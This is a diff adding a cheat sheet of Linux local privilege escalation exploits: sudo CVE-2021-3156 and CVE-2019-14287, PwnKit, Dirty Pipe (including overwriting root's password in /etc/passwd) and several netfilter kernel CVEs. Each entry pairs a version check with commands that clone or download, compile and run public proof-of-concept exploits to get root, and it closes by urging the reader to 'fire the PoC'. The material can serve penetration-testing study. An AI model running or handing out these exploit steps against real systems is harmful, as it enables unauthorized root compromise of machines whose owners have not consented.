@@ -1,0 +1,89 @@
+🛠️ SUDO Exploits
+✅ Got This: Can run sudo -V → Shows version < 1.9.5p2
+Then: Check for CVE-2021-3156 (heap overflow)
+
+bash
+Copy
+Edit
+sudo -V | head -n1  # Check version
+cat /etc/lsb-release  # Confirm OS version
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156 && make
+./sudo-hax-me-a-sandwich <target number>  # Match OS version
+✅ Got This: sudo -l allows /usr/bin/id or something specific
+Then: Try CVE-2019-14287 (UID -1 bypass)
+
+bash
+Copy
+Edit
+sudo -l
+sudo -u#-1 id  # ID -1 resolves to UID 0 (root)
+🔐 Polkit (PwnKit) – CVE-2021-4034
+✅ Got This: Can run pkexec
+Then: Try Pwnkit exploit
+
+bash
+Copy
+Edit
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc
+# Then:
+bash
+id  # Should be root
+🪠 Dirty Pipe – CVE-2022-0847
+✅ Got This: Kernel between 5.8 and 5.17 (check with uname -r)
+Then: Try Dirty Pipe exploit (2 versions)
+
+🔓 Exploit-1 (Backdoor /etc/passwd)
+bash
+Copy
+Edit
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
+./exploit-1  # root password becomes "piped"
+su  # then type "piped"
+🧨 Exploit-2 (Hijack SUID binary)
+bash
+Copy
+Edit
+find / -perm -4000 2>/dev/null  # Find a SUID binary
+./exploit-2 /usr/bin/sudo  # Or any found binary
+🌐 Netfilter PrivEsc
+✅ Got This: Kernel between 2.6 – 6.3.1 (uname -r)
+Then: Check against these CVEs
+
+🧱 CVE-2021-22555 (Kernels 2.6 – 5.11)
+bash
+Copy
+Edit
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+gcc -m32 -static exploit.c -o exploit
+./exploit
+id  # Should be root
+🧨 CVE-2022-25636 (Kernel 5.4 – 5.6.10)
+bash
+Copy
+Edit
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+cd CVE-2022-25636
+make
+./exploit
+🧬 CVE-2023-32233 (Kernel <= 6.3.1, nftables UAF)
+bash
+Copy
+Edit
+git clone https://github.com/Liuk3r/CVE-2023-32233
+cd CVE-2023-32233
+gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+./exploit
+id  # root again
+💥 Final Notes:
+All these are local privilege escalation exploits (LPE).
+
+Check uname -r and sudo -V early.
+
+If you think the system might be vulnerable, do your recon, match the version, then fire the PoC.
+
+Keep the id command in your payload to immediately validate escalation.
